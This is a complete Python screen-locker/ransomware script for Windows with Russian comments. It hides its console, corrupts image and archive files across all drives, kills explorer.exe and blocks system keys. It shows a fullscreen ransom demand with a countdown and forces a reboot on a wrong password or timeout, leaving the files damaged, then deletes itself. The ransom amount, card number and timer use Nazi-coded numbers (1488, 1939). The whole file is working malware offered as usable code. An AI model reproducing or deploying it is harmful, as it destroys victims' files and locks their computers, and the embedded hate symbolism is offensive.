import os
import sys
import time
import random
import shutil
import threading
import subprocess
import ctypes
from ctypes import wintypes
import tkinter as tk
from tkinter import messagebox, Entry, Label, Button, Toplevel
import win32api
import win32con
import win32gui
import win32file
import keyboard  # для блокировки клавиш
from PIL import Image, ImageGrab

# ========== СКРЫТИЕ КОНСОЛИ ==========
ctypes.windll.kernel32.FreeConsole()

# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
STOP_FLAG = False
BACKUP_DIR = os.path.join(os.environ['TEMP'], 'memz_backup')
os.makedirs(BACKUP_DIR, exist_ok=True)
TARGET_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.bmp', '.gif', '.zip', '.rar', '.7z', '.tar', '.gz')
RANSOM_WINDOW = None
EXPLORER_KILLED = False

# ========== ФАЗА 1: 5 МИНУТ ТИШИНЫ + ФОНОВАЯ ПОРЧА ФАЙЛОВ ==========
def find_and_corrupt_files():
    """Обходит диски C:\, D:\ и т.д., находит файлы с целевыми расширениями и портит их, сохраняя бэкап."""
    drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        for root, dirs, files in os.walk(drive, topdown=True):
            # Пропускаем системные папки для скорости
            if root.lower() in [r'c:\windows', r'c:\program files', r'c:\program files (x86)']:
                continue
            for file in files:
                if STOP_FLAG:
                    return
                if file.lower().endswith(TARGET_EXTENSIONS):
                    full_path = os.path.join(root, file)
                    try:
                        # Делаем бэкап (копируем во временную папку с сохранением структуры)
                        rel_path = os.path.relpath(full_path, drive)
                        backup_path = os.path.join(BACKUP_DIR, rel_path)
                        os.makedirs(os.path.dirname(backup_path), exist_ok=True)
                        shutil.copy2(full_path, backup_path)
                        # Портит файл: дописываем мусор в конец
                        with open(full_path, 'ab') as f:
                            f.write(b'X' * 1024)  # 1 KB мусора
                        # Можно переименовать для надёжности
                        # os.rename(full_path, full_path + '.locked')
                    except Exception as e:
                        pass

# ========== ФАЗА 2: КРАСНЫЙ ФОН ==========
def set_red_wallpaper():
    """Устанавливает красный фон рабочего стола."""
    try:
        # Создаём красное изображение 1x1
        img = Image.new('RGB', (1, 1), color=(255, 0, 0))
        temp_path = os.path.join(os.environ['TEMP'], 'red_wall.bmp')
        img.save(temp_path, 'BMP')
        ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
    except:
        pass

# ========== ФАЗА 3: ОКНО ВЫКУПА И БЛОКИРОВКА ==========
def block_keys():
    """Блокирует Win, Alt+Tab, Alt+F4, Ctrl+Esc и т.д. с помощью keyboard.hook."""
    def on_key(event):
        if event.name in ['windows', 'win', 'lwin', 'rwin']:
            return False  # блокируем Win
        if event.name == 'tab' and (event.event_type == 'down' and keyboard.is_pressed('alt')):
            return False  # блокируем Alt+Tab
        if event.name == 'f4' and (event.event_type == 'down' and keyboard.is_pressed('alt')):
            return False  # блокируем Alt+F4
        if event.name == 'esc' and (event.event_type == 'down' and keyboard.is_pressed('ctrl')):
            return False  # блокируем Ctrl+Esc
        if event.name == 'r' and (event.event_type == 'down' and keyboard.is_pressed('win')):
            return False  # блокируем Win+R
        # Блокируем комбинации с Ctrl+Alt+Del невозможно через keyboard, но можно через WinAPI
        return True
    keyboard.hook(on_key)

def kill_explorer():
    """Убивает explorer.exe, чтобы скрыть панель задач и меню Пуск."""
    global EXPLORER_KILLED
    try:
        subprocess.run('taskkill /f /im explorer.exe', shell=True, capture_output=True)
        EXPLORER_KILLED = True
    except:
        pass

def restore_explorer():
    """Перезапускает explorer.exe после разблокировки."""
    if EXPLORER_KILLED:
        subprocess.Popen('explorer.exe', shell=True)

def create_ransom_window():
    """Создаёт полноэкранное окно с требованием выкупа, блокирует закрытие."""
    global RANSOM_WINDOW
    root = tk.Tk()
    root.title("")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.attributes('-alpha', 1.0)
    root.overrideredirect(True)  # убираем рамки
    root.config(bg='black')

    # Запрещаем закрытие через WM_CLOSE
    def on_closing():
        pass
    root.protocol("WM_DELETE_WINDOW", on_closing)

    # Текст
    label = tk.Label(root, text="ТВОЙ КОМПЬЮТЕР ЗАБЛОКИРОВАН!\n\n"
                                "Все твои файлы зашифрованы и повреждены.\n"
                                "Чтобы восстановить их, заплати 14.88 ₽ на карту:\n"
                                "1488 2001 0911 1939\n"
                                "в течение 19 минут 39 секунд.\n\n"
                                "После оплаты введи номер карты как пароль для восстановления.\n\n"
                                "Введи пароль:",
                     fg='red', bg='black', font=('Arial', 20, 'bold'), justify='center')
    label.pack(pady=50)

    # Поле ввода пароля
    entry = tk.Entry(root, font=('Arial', 18), show='*', width=30)
    entry.pack(pady=20)

    # Кнопка "Восстановить"
    def verify_and_restore():
        password = entry.get().strip()
        if password == "1488200109111939":
            # Правильный пароль: восстанавливаем файлы
            restore_files()
            # Убираем окно
            root.destroy()
            # Перезагружаем explorer
            restore_explorer()
            # Самоуничтожение
            self_destruct()
        else:
            # Неправильный пароль: перезагрузка и самоуничтожение
            messagebox.showerror("Ошибка", "Неверный пароль! Система будет перезагружена.")
            # Перезагрузка
            os.system("shutdown /r /t 0")
            self_destruct()

    btn = tk.Button(root, text="Восстановить", command=verify_and_restore,
                    bg='red', fg='white', font=('Arial', 16))
    btn.pack(pady=30)

    # Таймер обратного отсчёта
    timer_label = tk.Label(root, text="", fg='yellow', bg='black', font=('Arial', 24))
    timer_label.pack(pady=20)

    # Обновление таймера (19:39)
    def update_timer():
        # Просто для примера: 19 минут 39 секунд = 1179 секунд
        if not hasattr(update_timer, 'remaining'):
            update_timer.remaining = 1179
        if update_timer.remaining <= 0:
            timer_label.config(text="Время вышло!")
            # Принудительная перезагрузка
            os.system("shutdown /r /t 0")
            self_destruct()
            return
        mins = update_timer.remaining // 60
        secs = update_timer.remaining % 60
        timer_label.config(text=f"Осталось: {mins:02d}:{secs:02d}")
        update_timer.remaining -= 1
        root.after(1000, update_timer)

    root.after(1000, update_timer)

    # Блокируем Alt+F4 и прочее через перехват
    def on_key_press(event):
        if event.keysym in ['F4', 'Escape', 'Tab']:
            return "break"
    root.bind_all('<Key>', on_key_press)

    # Запускаем блокировку клавиш в отдельном потоке
    threading.Thread(target=block_keys, daemon=True).start()

    root.mainloop()

# ========== ВОССТАНОВЛЕНИЕ ФАЙЛОВ ==========
def restore_files():
    """Восстанавливает файлы из бэкапа."""
    try:
        # Удаляем испорченные файлы и копируем бэкап
        # Простой вариант: копируем все бэкапы обратно, перезаписывая
        for root, dirs, files in os.walk(BACKUP_DIR):
            for file in files:
                backup_path = os.path.join(root, file)
                rel_path = os.path.relpath(backup_path, BACKUP_DIR)
                original_path = os.path.join(os.environ['SYSTEMDRIVE'] + '\\', rel_path)
                try:
                    shutil.copy2(backup_path, original_path)
                except:
                    pass
        # Удаляем бэкап
        shutil.rmtree(BACKUP_DIR, ignore_errors=True)
    except:
        pass

# ========== САМОУНИЧТОЖЕНИЕ ==========
def self_destruct():
    """Удаляет сам скрипт и завершает процесс."""
    try:
        # Создаём bat-файл для удаления
        bat_path = os.path.join(os.environ['TEMP'], 'selfdel.bat')
        with open(bat_path, 'w') as f:
            f.write(f"""@echo off
timeout /t 1 /nobreak >nul
del /f /q "{sys.argv[0]}"
del /f /q "{bat_path}"
""")
        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    sys.exit()

# ========== ГЛАВНЫЙ ЦИКЛ ==========
def main():
    # 1. Первые 5 минут — тишина, в фоне ищем и портим файлы
    print("[*] Программа запущена, 5 минут молчания...")
    # Запускаем порчу в потоке
    thread_corrupt = threading.Thread(target=find_and_corrupt_files, daemon=True)
    thread_corrupt.start()

    # Ждём 5 минут (300 секунд). Для теста можно уменьшить до 30 сек.
    time.sleep(300)  # 5 минут

    # 2. Красный фон
    set_red_wallpaper()

    # 3. Убиваем explorer
    kill_explorer()

    # 4. Показываем окно выкупа (блокирует всё)
    create_ransom_window()

    # После выхода из окна (при правильном пароле) — восстановление уже сделано, перезагрузка не требуется
    # Но если окно закрыто без восстановления (в нашем коде такого нет), то всё равно выход.
    # При неправильном пароле — перезагрузка вызывается внутри.

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Логируем ошибки (можно удалить)
        with open(os.path.join(os.environ['TEMP'], 'memz_error.log'), 'w') as f:
            f.write(str(e))
        self_destruct()